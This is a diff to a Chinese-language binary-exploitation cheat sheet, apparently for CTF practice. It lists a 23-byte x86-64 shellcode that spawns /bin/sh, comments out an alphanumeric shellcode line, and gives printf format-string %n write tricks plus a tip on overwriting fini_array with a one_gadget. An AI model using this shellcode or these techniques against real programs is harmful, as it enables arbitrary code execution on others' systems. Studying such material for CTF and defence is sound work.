@@ -11,8 +11,8 @@ shellcode:
     64位 较短的shellcode 23字节
         \x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05
     64位 纯ascii字符shellcode
-        Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
-
+        #Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t
+        
 
 
 函数返回值存放的寄存器
@@ -62,3 +62,5 @@ printf:
     %hhn %hn %n %ln     : 将在此之前打印的数量保存(分别1, 2, 4, 8字节)
     printf("%10c%6$n")  : 将10保存在第六个参数所指向的地址
     printf("%*1$c%2$n") : 将第一个参数赋值给第二个参数指向的地址
+
+fini_array:覆盖elf中的fini_array到one_gadget，程序在exit时会跳转到one_gadget
